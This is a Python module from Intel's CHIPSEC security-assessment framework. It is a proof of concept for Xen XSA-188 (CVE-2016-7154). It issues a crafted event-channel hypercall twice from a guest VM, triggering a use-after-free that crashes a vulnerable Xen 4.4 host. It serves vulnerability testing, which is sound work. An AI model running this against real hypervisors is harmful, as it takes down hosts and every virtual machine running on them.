# CHIPSEC: Platform Security Assessment Framework
# Copyright (c) 2010-2016, Intel Corporation
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; Version 2.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
#
# Contact information:
# chipsec@intel.com
#


"""
This module triggers host crash on vulnerable Xen 4.4

Reference:
    - `Proof-of-concept module for Xen XSA-188 <https://xenbits.xen.org/xsa/advisory-188.html>`_
        - CVE-2016-7154: "use after free in FIFO event channel code"
        - Discovered by Mikhail Gorobets

Usage:
    ``chipsec_main.py -m tools.vmm.xen.xsa188``

Examples:
    >>> chipsec_main.py -i -m tools.vmm.xen.xsa188

.. note::
    - Returns a Warning by default
    - System may be in an unknown state, further evaluation may be needed

.. important::
    - This module is designed to run in a VM environment
    - Behavior on physical HW is undefined

"""

from chipsec.module_common import BaseModule
from chipsec.library.returncode import ModuleResult
from chipsec.hal.vmm import VMM

EVENT_CHANNEL_OP = 32
EVTCHOP_INIT_CONTROL = 11


class xsa188(BaseModule):
    def __init__(self):
        BaseModule.__init__(self)
        self.result.url = 'https://chipsec.github.io/modules/chipsec.modules.tools.vmm.xen.xsa188.html'

    def run(self, module_argv):
        self.logger.start_test('Xen XSA-188 PoC check')
        (args_va, args_pa) = self.cs.mem.alloc_physical_mem(0x1000, 0xFFFFFFFFFFFFFFFF)
        args = '\xFF' * 8 + '\x00' * 16
        self.cs.mem.write_physical_mem(args_pa, len(args), args)
        self.vmm = VMM(self.cs)
        self.vmm.hypercall64_five_args(EVENT_CHANNEL_OP, EVTCHOP_INIT_CONTROL, args_va)
        self.vmm.hypercall64_five_args(EVENT_CHANNEL_OP, EVTCHOP_INIT_CONTROL, args_va)

        self.logger.log_information('Module completed')
        self.logger.log_warning('System may be in an unknown state, further evaluation may be needed.')
        self.result.setStatusBit(self.result.status.POTENTIALLY_VULNERABLE)
        self.res = self.result.getReturnCode(ModuleResult.WARNING)
        return self.res
